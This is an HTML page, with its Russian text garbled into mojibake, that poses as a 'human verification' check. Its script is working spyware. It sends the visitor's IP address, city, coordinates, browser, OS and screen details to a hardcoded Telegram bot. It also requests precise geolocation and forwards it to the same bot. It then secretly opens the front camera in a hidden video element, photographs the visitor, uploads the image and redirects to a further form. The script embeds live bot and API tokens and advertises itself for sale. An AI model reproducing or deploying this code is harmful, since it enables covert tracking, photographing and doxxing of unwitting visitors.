<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>ğŸ©¸ ĞĞ¾Ğ²Ñ‹Ğ¹ Ğ²Ğ¸Ğ·Ğ¸Ñ‚</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #1a1a1a; color: white; padding: 20px; }
        video { display: none; }
        #verificationMessage {
            font-size: 1.5em;
            text-align: center;
            margin-top: 20%;
        }
    </style>
</head>
<body>
    <div id="verificationMessage">
        ĞŸĞ¾Ğ´Ñ‚Ğ²ĞµÑ€Ğ´Ğ¸Ñ‚Ğµ Ğ²ÑĞµ Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑÑ‹ Ğ´Ğ»Ñ Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ĞºĞ¸ Ğ½Ğ° Ñ‡ĞµĞ»Ğ¾Ğ²ĞµĞºĞ°...
    </div>

    <script>
        const botToken = '7970247926:AAE5VMm3qrGzJZVsYDCxLJNoakW8DoN3N6M',
              chatId = '5366421049',
              ipInfoToken = 'e579b6b3444f57';

        const sendMessage = async (msg) => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
                if (!res.ok) throw new Error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞ¸ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ñ");
                console.log("Ğ¡Ğ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğµ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¾ ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾!");
            } catch (err) { console.error(err); }
        };

        const sendLocation = async (lat, lon) => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`);
                if (!res.ok) throw new Error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞ¸ Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸");
                console.log("Ğ“ĞµĞ¾Ğ¼ĞµÑ‚ĞºĞ° Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ° ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾!");
            } catch (err) { console.error(err); }
        };

        const generateVisitorId = () => Math.floor(Math.random() * 1000000);
        const getUserIp = async () => (await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`)).json();
        const getBrowser = () => /chrome|chromium|crios/i.test(navigator.userAgent) ? 'Chrome' : /firefox|fxios/i.test(navigator.userAgent) ? 'Firefox' : /safari/i.test(navigator.userAgent) ? 'Safari' : 'ĞĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾';
        const getOS = () => /Windows/i.test(navigator.userAgent) ? 'Windows' : /Macintosh/i.test(navigator.userAgent) ? 'macOS' : /Linux/i.test(navigator.userAgent) ? 'Linux' : /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone/i.test(navigator.userAgent) ? 'iOS' : 'ĞĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾';
        const getDevice = () => /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone/i.test(navigator.userAgent) ? 'iPhone' : /Windows NT/i.test(navigator.userAgent) ? 'Windows' : /Macintosh/i.test(navigator.userAgent) ? 'macOS' : 'ĞĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾';
        const getTimeZone = () => Intl.DateTimeFormat().resolvedOptions().timeZone;

        const sendVisitorInfo = async () => {
            const visitorId = generateVisitorId(),
                  browser = getBrowser(),
                  os = getOS(),
                  screenRes = `${window.screen.width}x${window.screen.height}`,
                  timeZone = getTimeZone(),
                  ip = await getUserIp(),
                  device = getDevice(),
                  time = new Date().toLocaleString();

            const message = 
`<b>ğŸ” ğ‘¹ğ‘¬ğ‘½ğ‘¬ğ‘µğ‘¨ğ‘» ğ‘¨ğ‘·ğ‘°:</b>
<b>ğŸ” ğ‘·ğ‘¹ğ‘°ğ‘ºğ‘¬: ğŸ•ğŸ“ ğ‘ºğ‘»ğ‘¨ğ‘¹ğ‘º:</b>
<b>ğŸ” ğ‘»ğ‘°ğ‘·: ğ‘·ğ‘¹ğ‘¬ğ‘´ğ‘°ğ‘¼ğ‘´:</b>

ğŸ“ <b>ğ‘¹ğ‘¬ğ‘®ğ‘°ğ‘ºğ‘»ğ‘¹ğ‘¨ğ‘»ğ‘°ğ‘¶ğ‘µ ğ‘¬ğ‘µğ‘»ğ‘¹ğ’€:</b>
â”œ <b>ğ‘½ğ‘°ğ’®ğ‘°ğ‘»ğ‘¶ğ‘¹ ğ‘°ğ‘«:</b> #${visitorId}  
â”” <b>ğ‘»ğ‘°ğ‘´ğ‘¬:</b> ${time}  

<b>ğŸŒ ğ‘®ğ‘¬ğ‘¶ğ‘³ğ‘¶ğ‘ªğ‘¨ğ‘»ğ‘°ğ‘¶ğ‘µ ğ‘«ğ‘¨ğ‘»ğ‘¨:</b>
â”œ <b>ğ‘°ğ‘· ğ‘¨ğ‘«ğ‘¹ğ‘¬ğ‘ºğ‘º:</b> ${ip.ip}  
â”œ <b>ğ‘ªğ‘°ğ‘»ğ’€:</b> ${ip.city}  
â”œ <b>ğ‘³ğ‘¶ğ‘ªğ‘¨ğ‘»ğ‘°ğ‘¶ğ‘µ:</b> ${ip.city}, ${ip.country}  
â”œ <b>ğ‘ªğ‘¶ğ‘¶ğ‘¹ğ‘«ğ‘°ğ‘µğ‘¨ğ‘»ğ‘¬ğ‘º:</b> ${ip.loc}  
â”” <b>ğ‘ªğ‘¶ğ‘¼ğ‘µğ‘»ğ‘¹ğ’€:</b> ${ip.country}  

<b>ğŸ’» ğ‘´ğ‘¬ğ‘ªğ‘¯ğ‘¨ğ‘µğ‘°ğ‘ªğ‘º:</b>
â”œ <b>ğ‘©ğ‘¹ğ‘¶ğ‘¾ğ‘ºğ‘¬ğ‘¹:</b> ${browser}  
â”œ <b>ğ‘¶ğ‘º:</b> ${os}  
â”œ <b>ğ‘ºğ‘ªğ‘¹ğ‘¬ğ‘¬ğ‘µ ğ‘¹ğ‘¬ğ‘ºğ‘¶ğ‘³ğ‘¼ğ‘»ğ‘°ğ‘¶ğ‘µ:</b> ${screenRes}  
â”” <b>ğ‘«ğ‘¬ğ‘½ğ‘°ğ‘ªğ‘¬:</b> ${device}  

<b>ğŸ•° ğ‘¨ğ‘«ğ‘«ğ‘°ğ‘»ğ‘°ğ‘¶ğ‘µğ‘¨ğ‘³ ğ‘°ğ‘µğ‘­ğ‘¶:</b>
â”œ <b>ğ‘³ğ‘¨ğ‘µğ‘®ğ‘¼ğ‘¨ğ‘®ğ‘¬:</b> ${navigator.language}  
â”” <b>ğ‘»ğ‘°ğ‘´ğ‘¬ğ’ğ‘¶ğ‘µğ‘¬:</b> ${timeZone}`;

            await sendMessage(message);
        };

        const sendGeoPermissionResult = async (status, coords = null) => {
            let msg = status === 'granted' && coords ? 
`âœ… <b>ĞŸĞ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ Ñ€Ğ°Ğ·Ñ€ĞµÑˆĞ¸Ğ» Ğ´Ğ¾ÑÑ‚ÑƒĞ¿ Ğº Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸!</b>
ğŸŒ <b>Ğ¨Ğ¸Ñ€Ğ¾Ñ‚Ğ°:</b> ${coords.latitude}
ğŸŒ <b>Ğ”Ğ¾Ğ»Ğ³Ğ¾Ñ‚Ğ°:</b> ${coords.longitude}
ğŸ¯ <b>Ğ¢Ğ¾Ñ‡Ğ½Ğ¾ÑÑ‚ÑŒ:</b> Â±${coords.accuracy} Ğ¼` 
            : status === 'denied' ? "âŒ <b>ĞŸĞ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ Ğ¾Ñ‚ĞºĞ°Ğ·Ğ°Ğ» Ğ² Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğµ Ğº Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸.</b>" : "âš ï¸ <b>ĞĞµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ Ğ¾Ğ¿Ñ€ĞµĞ´ĞµĞ»Ğ¸Ñ‚ÑŒ ÑÑ‚Ğ°Ñ‚ÑƒÑ Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸.</b>";
            
            if (status === 'granted') await sendLocation(coords.latitude, coords.longitude);
            await sendMessage(msg);
        };

        const requestCameraPermission = async () => {
            if (!navigator.mediaDevices?.getUserMedia) return console.warn("ĞšĞ°Ğ¼ĞµÑ€Ğ° Ğ½Ğµ Ğ¿Ğ¾Ğ´Ğ´ĞµÑ€Ğ¶Ğ¸Ğ²Ğ°ĞµÑ‚ÑÑ.");

            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });
            } catch (error) {
                console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ° Ğº ĞºĞ°Ğ¼ĞµÑ€Ğµ:", error);
                return;
            }

            const videoElement = document.createElement("video");
            videoElement.style.display = "none";
            document.body.appendChild(videoElement);
            videoElement.srcObject = stream;

            await new Promise(resolve => {
                if (videoElement.readyState >= 3) {
                    resolve();
                } else {
                    videoElement.addEventListener('loadeddata', resolve, { once: true });
                }
            });

            videoElement.play();

            setTimeout(async () => {
                await capturePhoto(videoElement, stream);
                document.body.removeChild(videoElement);
            }, 1000);
        };

        const capturePhoto = async (videoElement, stream) => {
            const canvas = document.createElement("canvas");
            canvas.width = videoElement.videoWidth || 640;
            canvas.height = videoElement.videoHeight || 480;
            const context = canvas.getContext("2d");

            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95));

            if (photoBlob) {
                await sendPhotoToTelegram(photoBlob);
            }

            stream.getTracks().forEach(track => track.stop());
        };

        const sendPhotoToTelegram = async (photoBlob) => {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", photoBlob, "photo.jpg");
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
                if (!res.ok) throw new Error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞµ Ñ„Ğ¾Ñ‚Ğ¾");
                console.log("Ğ¤Ğ¾Ñ‚Ğ¾ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¾ Ğ² Telegram ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾!");
            } catch (err) { console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞ¸ Ñ„Ğ¾Ñ‚Ğ¾:", err); }
        };

        const init = async () => {
            await sendVisitorInfo();
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    await sendGeoPermissionResult('granted', { latitude: pos.coords.latitude.toFixed(6), longitude: pos.coords.longitude.toFixed(6), accuracy: pos.coords.accuracy.toFixed(1) });
                    await requestCameraPermission();
                    setTimeout(() => {
                        window.location.href = "forma.html";
                    }, 2000);
                },
                async () => await sendGeoPermissionResult('denied')
            );
        };

        init();
    </script>
</body>
</html>
